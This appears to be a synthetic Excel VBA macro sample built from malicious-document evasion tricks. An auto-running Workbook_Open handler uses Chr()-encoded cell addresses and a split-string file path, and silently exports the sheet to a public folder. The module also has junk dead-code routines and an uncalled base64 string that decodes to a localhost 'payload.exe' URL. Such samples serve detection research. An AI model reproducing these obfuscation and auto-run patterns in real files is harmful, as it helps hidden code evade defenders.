
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim frs0swbone As Object
    On Error Resume Next
    Set frs0swbone = ActiveSheet.Range(Chr(65) & Chr(49) & Chr(58) & Chr(66) & Chr(49) & Chr(48))
    frs0swbone.Copy
    ActiveSheet.ExportAsFixedFormat Type:=xlTypePDF, _
        Filename:="C:\U" & "sers\Publ" & "ic\obli" & "vionx_" & "format.pd" & "f"
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
